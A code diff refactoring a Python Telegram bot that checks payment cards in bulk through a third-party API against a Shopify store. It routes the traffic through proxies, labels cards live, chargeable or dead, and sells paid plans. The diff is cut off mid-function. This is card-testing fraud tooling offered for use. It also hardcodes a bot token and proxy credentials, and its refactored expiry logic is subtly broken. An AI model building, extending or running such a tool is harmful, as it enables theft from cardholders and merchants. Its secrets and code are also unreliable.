@@ -1,122 +1,79 @@
 import os
 import json
 import logging
-import asyncio
 import random
 import string
 import re
 import requests
 import time
 from datetime import datetime, timedelta
-from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
-from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes, CallbackQueryHandler
+from telegram import Update
+from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
 
 # ============== CONFIGURATION ==============
 BOT_TOKEN = "8962210629:AAFhB5oNooreoJRhIuG7Frc9kqRxpQ2NWHA"
 OWNER_ID = 8570832903
-
-# API Configuration
 API_URL = "https://nik.cards/shopify"
 DEFAULT_PROXY = "ca-mon.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2"
 SITE = "https://aha-wrap.myshopify.com/"
-
-# Pricing Plans
-PLANS = {
-    "basic": {"price": 250, "duration": "1d", "label": "Basic - 1 Day"},
-    "monthly": {"price": 500, "duration": "30d", "label": "Monthly - 30 Days"},
-    "yearly": {"price": 1000, "duration": "365d", "label": "Yearly - 365 Days"},
-    "lifetime": {"price": 2500, "duration": "lifetime", "label": "Lifetime"}
-}
-
-# Free limits
 FREE_SINGLE_LIMIT = 131
 FREE_BULK_LIMIT = 1000
 
-# ============== DATABASE CLASS (JSON-based) ==============
+# ============== DATABASE ==============
 class Database:
     def __init__(self):
         self.db_file = "database.json"
         self.history_file = "history.json"
         self.reports_file = "reports.csv"
-        self._initialize_files()
+        self._init_files()
         self.data = self._load_data()
-    
-    def _initialize_files(self):
-        """Create database files if they don't exist"""
-        # Main database
+
+    def _init_files(self):
         if not os.path.exists(self.db_file):
-            initial_data = {
-                "users": {},
-                "redeem_codes": {},
-                "stats": {
-                    "total_checks": 0,
-                    "total_users": 0,
-                    "total_redeems": 0
-                }
-            }
             with open(self.db_file, 'w') as f:
-                json.dump(initial_data, f, indent=4)
-            print(f"✅ Created {self.db_file}")
-        
-        # History file
+                json.dump({"users": {}, "redeem_codes": {}, "stats": {"total_checks": 0, "total_users": 0, "total_redeems": 0}}, f, indent=4)
         if not os.path.exists(self.history_file):
             with open(self.history_file, 'w') as f:
                 json.dump([], f, indent=4)
-            print(f"✅ Created {self.history_file}")
-        
-        # Reports CSV file
         if not os.path.exists(self.reports_file):
             with open(self.reports_file, 'w') as f:
                 f.write("Timestamp,User_ID,Username,Card,Status,Charge,Proxy,Type\n")
-            print(f"✅ Created {self.reports_file}")
-        
-        # Create logs directory
         if not os.path.exists("logs"):
             os.makedirs("logs")
-            print("✅ Created logs directory")
-    
+
     def _load_data(self):
-        """Load data from JSON file"""
         try:
             with open(self.db_file, 'r') as f:
                 return json.load(f)
         except:
             return {"users": {}, "redeem_codes": {}, "stats": {"total_checks": 0, "total_users": 0, "total_redeems": 0}}
-    
+
     def _save_data(self):
-        """Save data to JSON file"""
         with open(self.db_file, 'w') as f:
             json.dump(self.data, f, indent=4)
-    
+
     def _save_history(self, entry):
-        """Save history entry"""
         try:
             with open(self.history_file, 'r') as f:
                 history = json.load(f)
         except:
             history = []
-        
         history.append(entry)
-        
         with open(self.history_file, 'w') as f:
             json.dump(history, f, indent=4)
-    
+
     def _save_report(self, user_id, username, card, status, charge, proxy, check_type):
-        """Save report to CSV"""
-        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
         with open(self.reports_file, 'a') as f:
-            f.write(f"{timestamp},{user_id},{username},{card},{status},{charge},{proxy},{check_type}\n")
-    
-    # ===== User Methods =====
+            f.write(f"{datetime.now().strftime('%Y-%m-%d %H:%M:%S')},{user_id},{username},{card},{status},{charge},{proxy},{check_type}\n")
+
     def get_user(self, user_id):
-        user_id = str(user_id)
-        return self.data["users"].get(user_id)
-    
+        return self.data["users"].get(str(user_id))
+
     def create_user(self, user_id, username, first_name, last_name):
-        user_id = str(user_id)
-        if user_id not in self.data["users"]:
-            self.data["users"][user_id] = {
-                "user_id": user_id,
+        uid = str(user_id)
+        if uid not in self.data["users"]:
+            self.data["users"][uid] = {
+                "user_id": uid,
                 "username": username or "Unknown",
                 "first_name": first_name or "Unknown",
                 "last_name": last_name or "",
@@ -132,101 +89,79 @@ class Database:
             self._save_data()
             return True
         return False
-    
+
     def update_user_plan(self, user_id, plan, duration):
-        user_id = str(user_id)
-        if user_id in self.data["users"]:
-            expiry = None
-            if duration != 'lifetime':
-                days = int(duration.replace('d', ''))
-                expiry = (datetime.now() + timedelta(days=days)).isoformat()
-            else:
-                expiry = 'lifetime'
-            
-            self.data["users"][user_id]["plan"] = plan
-            self.data["users"][user_id]["expiry_date"] = expiry
+        uid = str(user_id)
+        if uid in self.data["users"]:
+            expiry = None if duration == 'lifetime' else (datetime.now() + timedelta(days=int(duration.replace('d', '')))).isoformat() if duration != 'lifetime' else 'lifetime'
+            self.data["users"][uid]["plan"] = plan
+            self.data["users"][uid]["expiry_date"] = expiry
             self._save_data()
-    
+
     def add_credits(self, user_id, credits):
-        user_id = str(user_id)
-        if user_id in self.data["users"]:
-            self.data["users"][user_id]["credits"] += credits
+        uid = str(user_id)
+        if uid in self.data["users"]:
+            self.data["users"][uid]["credits"] += credits
             self._save_data()
-    
+
     def deduct_credits(self, user_id, amount):
-        user_id = str(user_id)
-        if user_id in self.data["users"]:
-            self.data["users"][user_id]["credits"] -= amount
+        uid = str(user_id)
+        if uid in self.data["users"]:
+            self.data["users"][uid]["credits"] -= amount
             self._save_data()
-    
+
     def get_user_credits(self, user_id):
-        user_id = str(user_id)
         user = self.get_user(user_id)
         return user["credits"] if user else 0
-    
+
     def get_user_plan(self, user_id):
-        user_id = str(user_id)
         user = self.get_user(user_id)
-        if user:
-            return (user["plan"], user["expiry_date"])
-        return None
-    
+        return (user["plan"], user["expiry_date"]) if user else None
+
     def increment_checks(self, user_id):
-        user_id = str(user_id)
-        if user_id in self.data["users"]:
-            self.data["users"][user_id]["total_checks"] += 1
+        uid = str(user_id)
+        if uid in self.data["users"]:
+            self.data["users"][uid]["total_checks"] += 1
             self.data["stats"]["total_checks"] += 1
             self._save_data()
-    
-    # ===== Proxy Methods =====
-    def add_proxy(self, user_id, proxy_string):
-        user_id = str(user_id)
-        if user_id in self.data["users"]:
-            if proxy_string not in self.data["users"][user_id]["proxies"]:
-                self.data["users"][user_id]["proxies"].append(proxy_string)
-                if not self.data["users"][user_id]["active_proxy"]:
-                    self.data["users"][user_id]["active_proxy"] = proxy_string
+
+    def add_proxy(self, user_id, proxy):
+        uid = str(user_id)
+        if uid in self.data["users"]:
+            if proxy not in self.data["users"][uid]["proxies"]:
+                self.data["users"][uid]["proxies"].append(proxy)
+                if not self.data["users"][uid]["active_proxy"]:
+                    self.data["users"][uid]["active_proxy"] = proxy
                 self._save_data()
                 return True
         return False
-    
-    def remove_proxy(self, user_id, proxy_string):
-        user_id = str(user_id)
-        if user_id in self.data["users"]:
-            if proxy_string in self.data["users"][user_id]["proxies"]:
-                self.data["users"][user_id]["proxies"].remove(proxy_string)
-                if self.data["users"][user_id]["active_proxy"] == proxy_string:
-                    self.data["users"][user_id]["active_proxy"] = None
-                    if self.data["users"][user_id]["proxies"]:
-                        self.data["users"][user_id]["active_proxy"] = self.data["users"][user_id]["proxies"][0]
-                self._save_data()
-                return True
+
+    def remove_proxy(self, user_id, proxy):
+        uid = str(user_id)
+        if uid in self.data["users"] and proxy in self.data["users"][uid]["proxies"]:
+            self.data["users"][uid]["proxies"].remove(proxy)
+            if self.data["users"][uid]["active_proxy"] == proxy:
+                self.data["users"][uid]["active_proxy"] = self.data["users"][uid]["proxies"][0] if self.data["users"][uid]["proxies"] else None
+            self._save_data()
+            return True
         return False
-    
-    def set_active_proxy(self, user_id, proxy_string):
-        user_id = str(user_id)
-        if user_id in self.data["users"]:
-            if proxy_string in self.data["users"][user_id]["proxies"]:
-                self.data["users"][user_id]["active_proxy"] = proxy_string
-                self._save_data()
-                return True
+
+    def set_active_proxy(self, user_id, proxy):
+        uid = str(user_id)
+        if uid in self.data["users"] and proxy in self.data["users"][uid]["proxies"]:
+            self.data["users"][uid]["active_proxy"] = proxy
+            self._save_data()
+            return True
         return False
-    
+
     def get_user_proxies(self, user_id):
-        user_id = str(user_id)
         user = self.get_user(user_id)
-        if user:
-            return user.get("proxies", [])
-        return []
-    
+        return user.get("proxies", []) if user else []
+
     def get_active_proxy(self, user_id):
-        user_id = str(user_id)
         user = self.get_user(user_id)
-        if user:
-            return user.get("active_proxy")
-        return None
-    
-    # ===== Redeem Code Methods =====
+        return user.get("active_proxy") if user else None
+
     def create_redeem_code(self, code, credits, duration, created_by):
         self.data["redeem_codes"][code] = {
             "code": code,
@@ -240,9 +175,9 @@ class Database:
         }
         self._save_data()
         return True
-    
+
     def use_redeem_code(self, code, user_id):
-        if code in self.data["redeem_codes"]:
+        if code in self.data["redeem_codes"] and not self.data["redeem_codes"][code]["is_used"]:
             self.data["redeem_codes"][code]["used_by"] = str(user_id)
             self.data["redeem_codes"][code]["used_date"] = datetime.now().isoformat()
             self.data["redeem_codes"][code]["is_used"] = True
@@ -250,425 +185,453 @@ class Database:
             self._save_data()
             return True
         return False
-    
+
     def get_redeem_code(self, code):
         return self.data["redeem_codes"].get(code)
-    
-    # ===== History Methods =====
-    def add_check_history(self, user_id, card_number, status, charge_amount, proxy, is_bulk=0):
+
+    def add_check_history(self, user_id, card, status, charge, proxy, is_bulk=0):
         entry = {
             "user_id": str(user_id),
-            "card_number": card_number,
+            "card_number": card,
             "status": status,
-            "charge_amount": charge_amount,
+            "charge_amount": charge,
             "proxy": proxy,
             "checked_date": datetime.now().isoformat(),
             "is_bulk": is_bulk
         }
         self._save_history(entry)
         self.increment_checks(user_id)
-        
         user = self.get_user(user_id)
         username = user["username"] if user else "Unknown"
-        check_type = "Bulk" if is_bulk else "Single"
-        self._save_report(user_id, username, card_number, status, charge_amount, proxy, check_type)
-    
+        self._save_report(user_id, username, card, status, charge, proxy, "Bulk" if is_bulk else "Single")
+
     def get_check_count(self, user_id, is_bulk=0):
         try:
             with open(self.history_file, 'r') as f:
                 history = json.load(f)
         except:
             return 0
-        
-        count = 0
         today = datetime.now().date()
+        count = 0
         for entry in history:
             if entry["user_id"] == str(user_id) and entry["is_bulk"] == is_bulk:
-                entry_date = datetime.fromisoformat(entry["checked_date"]).date()
-                if entry_date == today:
+                if datetime.fromisoformat(entry["checked_date"]).date() == today:
                     count += 1
         return count
-    
+
     def get_user_stats(self, user_id):
-        user_id = str(user_id)
         user = self.get_user(user_id)
         if not user:
             return None
-        
         try:
             with open(self.history_file, 'r') as f:
                 history = json.load(f)
         except:
             history = []
-        
-        total_checks = 0
-        live_count = 0
-        dead_count = 0
-        unknown_count = 0
-        charge_count = 0
-        
+        total = live = dead = unknown = charge = 0
         for entry in history:
-            if entry["user_id"] == user_id:
-                total_checks += 1
-                status = entry["status"]
-                if status == "Live":
-                    live_count += 1
-                elif status == "Charge":
-                    charge_count += 1
-                elif status == "Dead":
-                    dead_count += 1
-                else:
-                    unknown_count += 1
-        
-        return {
-            "total_checks": total_checks,
-            "live": live_count,
-            "dead": dead_count,
-            "unknown": unknown_count,
-            "charge": charge_count
-        }
+            if entry["user_id"] == str(user_id):
+                total += 1
+                s = entry["status"]
+                if s == "Live": live += 1
+                elif s == "Charge": charge += 1
+                elif s == "Dead": dead += 1
+                else: unknown += 1
+        return {"total_checks": total, "live": live, "dead": dead, "unknown": unknown, "charge": charge}
 
-# ============== CARD CHECKER CLASS ==============
+# ============== CARD CHECKER ==============
 class CardChecker:
     def __init__(self):
         self.api_url = API_URL
         self.site = SITE
-    
+
     def check_card(self, card_number, proxy_string=None):
+        proxy_to_use = proxy_string if proxy_string else DEFAULT_PROXY
         try:
-            proxy_to_use = proxy_string if proxy_string else DEFAULT_PROXY
-            
-            proxy_parts = proxy_to_use.split(':')
-            if len(proxy_parts) == 4:
-                proxy_host, proxy_port, proxy_user, proxy_pass = proxy_parts
-                proxy_url = f"http://{proxy_user}:{proxy_pass}@{proxy_host}:{proxy_port}"
+            parts = proxy_to_use.split(':')
+            proxies = None
+            if len(parts) == 4:
+                host, port, user, passwd = parts
+                proxy_url = f"http://{user}:{passwd}@{host}:{port}"
                 proxies = {"http": proxy_url, "https": proxy_url}
-            else:
-                proxies = None
-            
-            params = {
-                'site': self.site,
-                'cc': card_number,
-                'proxy': proxy_to_use
-            }
-            
+            params = {'site': self.site, 'cc': card_number, 'proxy': proxy_to_use}
             headers = {
                 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
-                'Accept': 'application/json',
-                'Accept-Language': 'en-US,en;q=0.9',
-                'Accept-Encoding': 'gzip, deflate, br',
-                'Connection': 'keep-alive',
-                'Sec-Fetch-Dest': 'empty',
-                'Sec-Fetch-Mode': 'cors',
-                'Sec-Fetch-Site': 'cross-site'
+                'Accept': 'application/json'
             }
-            
-            response = requests.get(
-                self.api_url,
-                params=params,
-                proxies=proxies,
-                headers=headers,
-                timeout=30
-            )
-            
-            data = response.json()
-            
+            resp = requests.get(self.api_url, params=params, proxies=proxies, headers=headers, timeout=30)
+            data = resp.json()
             if 'status' in data:
                 status = data['status'].lower()
                 charge = data.get('charge', '0.00')
-                
-                if 'shopify' in data.get('gateway', '').lower() or 'shopify' in self.site.lower():
-                    if status == 'success' or status == 'live':
-                        return ('Live', charge, data, proxy_to_use)
-                    elif status == 'charge' or status == 'charged':
-                        return ('Charge', charge, data, proxy_to_use)
-                    elif status == 'failed' or status == 'dead' or status == 'error':
-                        return ('Dead', '0.00', data, proxy_to_use)
-                    elif status == 'pending' or status == 'unknown':
-                        return ('Unknown', '0.00', data, proxy_to_use)
-                    else:
-                        if 'invalid' in str(data).lower() or 'declined' in str(data).lower():
-                            return ('Dead', '0.00', data, proxy_to_use)
-                        elif 'success' in str(data).lower() or 'approved' in str(data).lower():
-                            return ('Live', charge, data, proxy_to_use)
-                        else:
-                            return ('Unknown', '0.00', data, proxy_to_use)
-                else:
-                    if status == 'live' or status == 'success':
-                        return ('Live', charge, data, proxy_to_use)
-                    elif status == 'charge' or status == 'charged':
-                        return ('Charge', charge, data, proxy_to_use)
-                    elif status == 'dead' or status == 'failed' or status == 'error':
-                        return ('Dead', '0.00', data, proxy_to_use)
-                    else:
-                        return ('Unknown', '0.00', data, proxy_to_use)
-            else:
-                if 'shopify' in str(data).lower() or 'payment' in str(data).lower():
-                    if 'status' in str(data).lower():
-                        if 'success' in str(data).lower() or 'approved' in str(data).lower():
-                            return ('Live', '0.00', data, proxy_to_use)
-                        elif 'declined' in str(data).lower() or 'failed' in str(data).lower():
-                            return ('Dead', '0.00', data, proxy_to_use)
-                        else:
-                            return ('Unknown', '0.00', data, proxy_to_use)
-                    else:
-                        return ('Unknown', '0.00', data, proxy_to_use)
+                if status in ('live', 'success'):
+                    return ('Live', charge, data, proxy_to_use)
+                elif status in ('charge', 'charged'):
+                    return ('Charge', charge, data, proxy_to_use)
+                elif status in ('dead', 'failed', 'error'):
+                    return ('Dead', '0.00', data, proxy_to_use)
                 else:
                     return ('Unknown', '0.00', data, proxy_to_use)
-                
-        except requests.exceptions.Timeout:
-            return ('Unknown', '0.00', {'error': 'Timeout - Gateway may be down'}, proxy_to_use)
-        except requests.exceptions.RequestException as e:
-            return ('Unknown', '0.00', {'error': f'Request failed: {str(e)}'}, proxy_to_use)
-        except json.JSONDecodeError:
-            try:
-                response_text = response.text.lower()
-                if 'success' in response_text or 'approved' in response_text:
-                    return ('Live', '0.00', {'response': response_text}, proxy_to_use)
-                elif 'declined' in response_text or 'failed' in response_text:
-                    return ('Dead', '0.00', {'response': response_text}, proxy_to_use)
-                else:
-                    return ('Unknown', '0.00', {'response': response_text}, proxy_to_use)
-            except:
-                return ('Unknown', '0.00', {'error': 'Invalid response format'}, proxy_to_use)
+            else:
+                return ('Unknown', '0.00', data, proxy_to_use)
         except Exception as e:
             return ('Unknown', '0.00', {'error': str(e)}, proxy_to_use)
-    
-    def check_bulk(self, card_numbers, proxy_string=None):
-        results = []
-        for card in card_numbers:
-            status, charge, data, proxy = self.check_card(card, proxy_string)
-            results.append({
-                'card': card,
-                'status': status,
-                'charge': charge,
-                'data': data,
-                'proxy': proxy
-            })
-            time.sleep(0.5)
-        return results
 
-# ============== REDEEM CODE MANAGER ==============
-class RedeemCodeManager:
-    @staticmethod
-    def generate_code(length=12):
-        characters = string.ascii_uppercase + string.digits
-        return ''.join(random.choices(characters, k=length))
-    
-    @staticmethod
-    def parse_duration(duration_str):
-        if duration_str.endswith('m'):
-            months = int(duration_str[:-1])
-            return months * 30
-        elif duration_str.endswith('y'):
-            years = int(duration_str[:-1])
-            return years * 365
-        else:
-            return int(duration_str)
-
-# ============== UTILITY FUNCTIONS ==============
-def validate_card(card_number):
-    card_number = re.sub(r'\s+', '', card_number)
-    if not card_number.isdigit():
+# ============== HELPERS ==============
+def validate_card(card):
+    card = re.sub(r'\s+', '', card)
+    if not card.isdigit() or len(card) < 13 or len(card) > 19:
         return False
-    
-    if len(card_number) < 13 or len(card_number) > 19:
-        return False
-    
     total = 0
-    reverse_digits = card_number[::-1]
-    for i, digit in enumerate(reverse_digits):
-        n = int(digit)
+    for i, d in enumerate(reversed(card)):
+        n = int(d)
         if i % 2 == 1:
             n *= 2
             if n > 9:
                 n -= 9
         total += n
-    
     return total % 10 == 0
 
-def format_card_for_display(card):
-    if len(card) >= 16:
-        return f"{card[:4]}****{card[-4:]}"
-    return card
+def format_card(card):
+    return f"{card[:4]}****{card[-4:]}" if len(card) >= 16 else card
 
 def parse_file_content(content):
-    lines = content.split('\n')
-    cards = []
-    for line in lines:
-        line = line.strip()
-        if line and validate_card(line):
-            cards.append(line)
-    return cards
+    return [line.strip() for line in content.split('\n') if line.strip() and validate_card(line.strip())]
 
-def validate_proxy(proxy_string):
-    parts = proxy_string.split(':')
-    if len(parts) == 4:
-        host, port, username, password = parts
-        if host and port.isdigit() and username and password:
-            return True
-    return False
+def validate_proxy(proxy):
+    parts = proxy.split(':')
+    return len(parts) == 4 and parts[0] and parts[1].isdigit() and parts[2] and parts[3]
 
-# ============== TELEGRAM BOT HANDLERS ==============
+class RedeemCodeManager:
+    @staticmethod
+    def generate_code(length=12):
+        return ''.join(random.choices(string.ascii_uppercase + string.digits, k=length))
+
+# ============== BOT HANDLERS ==============
 db = Database()
-card_checker = CardChecker()
-redeem_manager = RedeemCodeManager()
+checker = CardChecker()
+code_manager = RedeemCodeManager()
 
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user = update.effective_user
-    db.create_user(
-        user.id,
-        user.username or "Unknown",
-        user.first_name or "Unknown",
-        user.last_name or ""
+    db.create_user(user.id, user.username, user.first_name, user.last_name)
+    await update.message.reply_text(
+        f"🎯 Welcome to Shopify Card Checker Bot!\n\n"
+        f"Hi {user.first_name}! Use /help for commands.",
+        parse_mode='Markdown'
     )
-    
-    welcome_text = f"""
-🎯 *Welcome to Shopify Card Checker Bot* 🎯
-
-Hey {user.first_name}! 👋
-
-This bot validates credit/debit cards through Shopify payment gateway:
-✅ Live cards (valid and working)
-✅ Dead cards (invalid/declined)
-✅ Unknown status
-✅ Charge amount detection
-
-💳 *Commands:*
-• `/sh` - Check single card
-• `/msh` - Check multiple cards (free: {FREE_SINGLE_LIMIT} cards)
-• `/chk` - Check cards from .txt file
-• `/proxy` - Manage your proxies
-• `/redeem` - Redeem code for premium
-• `/plan` - Check your plan & credits
-• `/stats` - Your check statistics
-• `/buy` - Premium plan details
-• `/help` - Help & support
-
-🛒 *Shopify Gateway:* {SITE}
-🌐 *Default Proxy:* {DEFAULT_PROXY[:30]}...
-
-📌 *Free users:* {FREE_SINGLE_LIMIT} single checks per day
-
-🔒 *Premium Features:*
-• Unlimited checks
-• Bulk file processing
-• Priority support
-
-Developed by: @theaadikoder
-"""
-    await update.message.reply_text(welcome_text, parse_mode='Markdown')
 
 async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    help_text = f"""
-📚 *Help & Commands Guide*
-
-🛒 *Shopify Gateway:* {SITE}
-
-🔹 `/sh 4111111111111111` - Check single card
-🔹 `/msh 4111111111111111|4111111111111112` - Check multiple cards (separate with |)
-🔹 `/chk` - Reply to a .txt file to check cards in bulk
-🔹 `/proxy` - Manage your proxies
-🔹 `/redeem <code>` - Redeem your premium code
-🔹 `/plan` - Check your current plan and credits
-🔹 `/stats` - View your check statistics
-🔹 `/buy` - View premium plan details
-🔹 `/get_red <credits> <duration>` - Owner only: Generate redeem code
-
-*Proxy Management:*
-• `/proxy add host:port:user:pass` - Add a new proxy
-• `/proxy list` - View all your proxies
-• `/proxy set host:port:user:pass` - Set active proxy
-• `/proxy remove host:port:user:pass` - Remove a proxy
-• `/proxy active` - Show current active proxy
-
-*How to use:*
-1. For single card: `/sh 4111111111111111`
-2. For multiple: `/msh 4111111111111111|4111111111111112|4111111111111113`
-3. For file: Send a .txt file with card numbers (one per line)
-
-*Card Status Meanings:*
-✅ Live - Card is valid and working
-💰 Charge - Card has money, amount shown
-❌ Dead - Card is invalid or declined
-❓ Unknown - Status could not be determined
-
-*Owner Commands:*
-• `/get_red 300 1m` - Generate 1 month premium code with 300 credits
-• `/get_red 1000 1y` - Generate 1 year premium code with 1000 credits
-• `/stats all` - View bot statistics (owner only)
-
-Contact: @theaadikoder
-"""
-    await update.message.reply_text(help_text, parse_mode='Markdown')
+    await update.message.reply_text(
+        f"📚 Commands:\n"
+        f"/sh <card> – single check\n"
+        f"/msh <card1|card2> – multiple\n"
+        f"/chk – reply to .txt file\n"
+        f"/proxy – manage proxies\n"
+        f"/redeem <code> – redeem premium\n"
+        f"/plan – your plan & credits\n"
+        f"/stats – your stats\n"
+        f"/buy – premium plans\n"
+        f"/get_red <credits> <duration> – owner only\n\n"
+        f"Proxy format: host:port:user:pass",
+        parse_mode='Markdown'
+    )
 
 async def single_check(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
-    args = context.args
-    
-    if not args:
-        await update.message.reply_text("❌ Please provide a card number.\nExample: `/sh 4111111111111111`", parse_mode='Markdown')
+    if not context.args:
+        await update.message.reply_text("Usage: /sh <card>")
         return
-    
-    card = args[0].strip()
-    
+    card = context.args[0].strip()
     if not validate_card(card):
-        await update.message.reply_text("❌ Invalid card number. Please check and try again.")
+        await update.message.reply_text("Invalid card number.")
         return
-    
     user_plan = db.get_user_plan(user_id)
-    credits = db.get_user_credits(user_id)
-    
     is_premium = user_plan and user_plan[0] != 'free'
-    if not is_premium and credits <= 0:
-        await update.message.reply_text(
-            "❌ You have no credits left!\n"
-            "Use `/buy` to get premium or contact @theaadikoder"
-        )
+    if not is_premium and db.get_user_credits(user_id) <= 0:
+        await update.message.reply_text("No credits. Buy premium with /buy.")
         return
-    
-    active_proxy = db.get_active_proxy(user_id)
-    if not active_proxy:
-        active_proxy = DEFAULT_PROXY
-    
+    proxy = db.get_active_proxy(user_id) or DEFAULT_PROXY
     if not is_premium:
         db.deduct_credits(user_id, 1)
-    
-    status_text = await update.message.reply_text(f"🔄 Checking card through Shopify gateway using proxy: `{active_proxy[:30]}...`", parse_mode='Markdown')
-    
-    status, charge, data, used_proxy = card_checker.check_card(card, active_proxy)
-    
-    db.add_check_history(user_id, card, status, charge, used_proxy, is_bulk=0)
-    
-    formatted_card = format_card_for_display(card)
-    
-    status_emoji = {
-        'Live': '✅',
-        'Charge': '💰',
-        'Dead': '❌',
-        'Unknown': '❓'
-    }.get(status, '❓')
-    
-    response = f"""
-💳 *Shopify Card Validation Result*
+    msg = await update.message.reply_text("Checking...")
+    status, charge, data, used_proxy = checker.check_card(card, proxy)
+    db.add_check_history(user_id, card, status, charge, used_proxy)
+    emoji = {"Live":"✅","Charge":"💰","Dead":"❌","Unknown":"❓"}.get(status,"❓")
+    reply = f"💳 Shopify Result\n\nCard: `{format_card(card)}`\nStatus: {emoji} *{status}*\n"
+    if status == "Charge":
+        reply += f"Amount: *${charge}*\n"
+    reply += f"Proxy: `{used_proxy[:30]}...`\n"
+    if not is_premium:
+        reply += f"\nRemaining credits: {db.get_user_credits(user_id)}"
+    await msg.edit_text(reply, parse_mode='Markdown')
 
-🛒 Gateway: `{SITE}`
-🌐 Proxy Used: `{used_proxy[:30]}...`
-📇 Card: `{formatted_card}`
-{status_emoji} Status: *{status}*
+async def multi_check(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user_id = update.effective_user.id
+    if not context.args:
+        await update.message.reply_text("Usage: /msh <card1|card2|...>")
+        return
+    cards = [c.strip() for c in context.args[0].split('|') if c.strip() and validate_card(c.strip())]
+    if not cards:
+        await update.message.reply_text("No valid cards.")
+        return
+    user_plan = db.get_user_plan(user_id)
+    is_premium = user_plan and user_plan[0] != 'free'
+    if not is_premium:
+        if db.get_user_credits(user_id) <= 0:
+            await update.message.reply_text("No credits.")
+            return
+        daily = db.get_check_count(user_id)
+        if daily >= FREE_SINGLE_LIMIT:
+            await update.message.reply_text(f"Daily free limit ({FREE_SINGLE_LIMIT}) reached.")
+            return
+        limit = min(len(cards), db.get_user_credits(user_id), FREE_SINGLE_LIMIT - daily)
+        cards = cards[:limit]
+    if not cards:
+        await update.message.reply_text("No cards to check.")
+        return
+    proxy = db.get_active_proxy(user_id) or DEFAULT_PROXY
+    msg = await update.message.reply_text(f"Checking {len(cards)} cards...")
+    results = []
+    for i, card in enumerate(cards):
+        status, charge, data, used_proxy = checker.check_card(card, proxy)
+        db.add_check_history(user_id, card, status, charge, used_proxy)
+        if not is_premium:
+            db.deduct_credits(user_id, 1)
+        results.append((card, status, charge))
+        if (i+1) % 5 == 0:
+            await msg.edit_text(f"Progress: {i+1}/{len(cards)}")
+    reply = f"📊 Results ({len(results)} cards)\nProxy: `{proxy[:30]}...`\n\n"
+    live = charge = dead = unknown = 0
+    for card, status, amt in results:
+        emoji = {"Live":"✅","Charge":"💰","Dead":"❌","Unknown":"❓"}.get(status,"❓")
+        reply += f"{emoji} `{format_card(card)}` → *{status}*"
+        if status in ("Live","Charge"):
+            reply += f" (${amt})"
+        reply += "\n"
+        if status == "Live": live += 1
+        elif status == "Charge": charge += 1
+        elif status == "Dead": dead += 1
+        else: unknown += 1
+    summary = f"\n✅ Live: {live}  💰 Charge: {charge}  ❌ Dead: {dead}  ❓ Unknown: {unknown}"
+    if not is_premium:
+        summary += f"\nRemaining credits: {db.get_user_credits(user_id)}"
+    await msg.edit_text(reply + summary, parse_mode='Markdown')
 
-"""
-
-    if status == 'Live':
-        response += "✅ Card is VALID and working on Shopify\n"
-    elif status == 'Charge':
-        response += f"💰 Card has funds! Amount: *${charge}*\n"
-    elif status == 'Dead':
-        response += "❌ Card is INVALID or declined by Shopify\n"
+async def file_check(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user_id = update.effective_user.id
+    if not update.message.document or not update.message.document.file_name.endswith('.txt'):
+        await update.message.reply_text("Please send a .txt file.")
+        return
+    user_plan = db.get_user_plan(user_id)
+    is_premium = user_plan and user_plan[0] != 'free'
+    if not is_premium:
+        if db.get_user_credits(user_id) <= 0:
+            await update.message.reply_text("No credits.")
+            return
+        limit = FREE_BULK_LIMIT
     else:
-        response += "❓ Status could not be determined\n"
-    
-    response += f"""
-📝 Details:
-```json
-{json.dumps(data, indent=2)}
+        limit = float('inf')
+    proxy = db.get_active_proxy(user_id) or DEFAULT_PROXY
+    msg = await update.message.reply_text("Downloading file...")
+    try:
+        file = await update.message.document.get_file()
+        content = (await file.download_as_bytearray()).decode('utf-8')
+        cards = parse_file_content(content)
+        if not cards:
+            await msg.edit_text("No valid cards found.")
+            return
+        cards_to_check = cards[:limit] if limit != float('inf') else cards
+        await msg.edit_text(f"Checking {len(cards_to_check)} cards...")
+        results = []
+        for i, card in enumerate(cards_to_check):
+            status, charge, data, used_proxy = checker.check_card(card, proxy)
+            db.add_check_history(user_id, card, status, charge, used_proxy, is_bulk=1)
+            if not is_premium:
+                db.deduct_credits(user_id, 1)
+            results.append((card, status, charge))
+            if (i+1) % 10 == 0:
+                await msg.edit_text(f"Progress: {i+1}/{len(cards_to_check)}")
+        # Build report safely
+        report_lines = []
+        report_lines.append("Shopify Card Validation Report")
+        report_lines.append("=" * 50)
+        report_lines.append(f"Gateway: {SITE}")
+        report_lines.append(f"Proxy: {proxy}")
+        report_lines.append("=" * 50)
+        report_lines.append("")
+        live = charge = dead = unknown = 0
+        for card, status, amt in results:
+            line = f"Card: {card} | Status: {status}"
+            if status in ("Live","Charge"):
+                line += f" | Charge: ${amt}"
+            report_lines.append(line)
+            if status == "Live": live += 1
+            elif status == "Charge": charge += 1
+            elif status == "Dead": dead += 1
+            else: unknown += 1
+        report_lines.append("")
+        report_lines.append(f"Summary: Live: {live}, Charge: {charge}, Dead: {dead}, Unknown: {unknown}")
+        if not is_premium:
+            report_lines.append(f"Remaining credits: {db.get_user_credits(user_id)}")
+        report_content = "\n".join(report_lines)
+        filename = f"report_{user_id}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
+        with open(filename, 'w') as f:
+            f.write(report_content)
+        with open(filename, 'rb') as f:
+            await update.message.reply_document(document=f, filename=filename, caption="Report ready.")
+        os.remove(filename)
+        summary = f"✅ Done! {len(results)} cards checked.\nLive: {live}, Charge: {charge}, Dead: {dead}, Unknown: {unknown}"
+        if not is_premium:
+            summary += f"\nRemaining credits: {db.get_user_credits(user_id)}"
+        await msg.edit_text(summary)
+    except Exception as e:
+        await msg.edit_text(f"Error: {str(e)}")
+
+async def proxy_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user_id = update.effective_user.id
+    if not context.args:
+        proxies = db.get_user_proxies(user_id)
+        active = db.get_active_proxy(user_id)
